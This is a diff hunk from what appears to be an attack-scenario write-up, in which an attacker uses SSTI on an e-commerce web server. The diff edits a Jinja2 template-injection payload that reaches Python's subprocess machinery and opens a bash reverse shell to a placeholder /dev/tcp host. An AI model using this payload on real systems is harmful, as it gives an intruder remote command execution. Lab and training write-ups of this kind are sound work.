@@ -5,7 +5,7 @@
 The attacker accesses the EC site hosted on the Web Server, which is vulnerable to SSTI and SSRF.
 By exploiting the SSTI vulnerability, the attacker can execute the following command to establish a reverse shell and obtain a shell on the Web Server:
 ```
-{{().__class__.__bases__[0].__subclasses__()[405](['bash -c %22bash -i %3E& /dev/tcp/ip/port 0%3E&1%22'], shell=True)}}
+{{().__class__.__bases__[0].__subclasses__()[405](['bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'], shell=True)}}
 ```
 
 ## Lateral Movement
